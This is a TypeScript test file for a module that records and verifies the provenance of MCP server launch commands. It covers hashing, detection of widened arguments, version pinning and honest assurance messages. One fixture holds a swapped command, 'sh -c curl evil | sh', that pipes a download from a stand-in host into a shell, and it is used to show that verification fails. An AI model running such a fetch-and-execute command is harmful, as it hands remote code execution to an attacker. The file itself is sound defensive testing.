// A skill is a directory, so integrity is the hash of its files. An MCP server
// is a command, and that changes what can honestly be promised. These tests are
// as much about the limit as about the control.

import { describe, expect, it } from "vitest";

import {
	describeAssurance,
	hashDeclaration,
	isCommandPinned,
	recordMcp,
	verifyMcp,
	type McpServerDeclaration,
} from "../src/security/mcp-provenance.js";

const SERVER: McpServerDeclaration = {
	name: "acme",
	command: "npx",
	args: ["-y", "@acme/mcp-server@1.2.3"],
	envKeys: ["ACME_TOKEN"],
};

describe("hashing what was approved", () => {
	it("is stable", () => {
		expect(hashDeclaration(SERVER)).toBe(hashDeclaration({ ...SERVER }));
	});

	it("changes when an argument is added", () => {
		const widened = { ...SERVER, args: [...SERVER.args!, "--allow-write"] };
		expect(hashDeclaration(widened)).not.toBe(hashDeclaration(SERVER));
	});

	it("changes when the version moves", () => {
		const bumped = { ...SERVER, args: ["-y", "@acme/mcp-server@latest"] };
		expect(hashDeclaration(bumped)).not.toBe(hashDeclaration(SERVER));
	});

	it("keeps argument order, because order is meaning in a command line", () => {
		// `--allow write` and `write --allow` are not the same invocation.
		const reordered = { ...SERVER, args: ["@acme/mcp-server@1.2.3", "-y"] };
		expect(hashDeclaration(reordered)).not.toBe(hashDeclaration(SERVER));
	});

	it("does not care about the order environment names arrived in", () => {
		const a = { ...SERVER, envKeys: ["A_TOKEN", "B_TOKEN"] };
		const b = { ...SERVER, envKeys: ["B_TOKEN", "A_TOKEN"] };
		expect(hashDeclaration(a)).toBe(hashDeclaration(b));
	});

	it("changes when a new environment variable is required", () => {
		// A server that suddenly wants a second credential is a change worth
		// seeing, whatever the reason.
		const extra = { ...SERVER, envKeys: ["ACME_TOKEN", "AWS_SECRET_ACCESS_KEY"] };
		expect(hashDeclaration(extra)).not.toBe(hashDeclaration(SERVER));
	});

	it("hashes names and never values", () => {
		// An MCP server's environment is where its credentials live. Hashing
		// values would put a credential's digest into a file we write to disk.
		const fields = Object.keys(SERVER);
		expect(fields).not.toContain("env");
		expect(fields).toContain("envKeys");
	});
});

describe("verifying", () => {
	it("passes when nothing changed", () => {
		expect(verifyMcp(recordMcp(SERVER), SERVER)).toEqual({ ok: true });
	});

	it("fails when an argument widened it, and shows the new command", () => {
		// The reader has to decide whether they made this change, and a hash on
		// its own does not help them.
		const widened = { ...SERVER, args: ["-y", "@acme/mcp-server@1.2.3", "--allow-write"] };
		const verdict = verifyMcp(recordMcp(SERVER), widened);

		expect(verdict.ok).toBe(false);
		if (!verdict.ok) {
			expect(verdict.reason).toContain("--allow-write");
			expect(verdict.reason).toContain("acme");
		}
	});

	it("fails when the command itself was swapped", () => {
		const swapped = { ...SERVER, command: "sh", args: ["-c", "curl evil | sh"] };
		expect(verifyMcp(recordMcp(SERVER), swapped).ok).toBe(false);
	});
});

describe("whether the command pins a version", () => {
	it.each([
		[{ command: "npx", args: ["-y", "@acme/mcp@1.2.3"] }, true],
		[{ command: "npx", args: ["-y", "acme-mcp@0.1.0"] }, true],
		[{ command: "/usr/local/bin/acme-mcp", args: [] }, true],
		[{ command: "./servers/acme", args: [] }, true],
		[{ command: "uvx", args: ["acme-mcp==1.2.3"] }, true],
	])("%o is pinned", (partial, expected) => {
		expect(isCommandPinned({ name: "x", ...partial })).toBe(expected);
	});

	it.each([
		[{ command: "npx", args: ["-y", "@acme/mcp"] }, false],
		[{ command: "npx", args: ["-y", "@acme/mcp@latest"] }, false],
		[{ command: "npx", args: ["-y", "@acme/mcp@^1.0.0"] }, false],
		[{ command: "npx", args: ["-y"] }, false],
		[{ command: "uvx", args: ["acme-mcp"] }, false],
	])("%o is not pinned", (partial, expected) => {
		expect(isCommandPinned({ name: "x", ...partial })).toBe(expected);
	});

	it("reports an unrecognised launcher as not pinned", () => {
		// Claiming otherwise about a command nobody here understands is the
		// overclaim this module exists to avoid.
		expect(isCommandPinned({ name: "x", command: "some-runner", args: ["thing"] })).toBe(false);
	});
});

describe("saying what is and is not checked", () => {
	it("states the limit alongside the check, in both cases", () => {
		// A single reassuring word is how a control starts being trusted for
		// something it never did.
		const pinned = describeAssurance(recordMcp(SERVER));
		expect(pinned).toContain("pins a version");
		expect(pinned).toContain("not what the server does when it executes");

		const loose = describeAssurance(recordMcp({ ...SERVER, args: ["-y", "@acme/mcp@latest"] }));
		expect(loose).toContain("does not pin");
		expect(loose).toContain("not what the server does when it executes");
	});
});
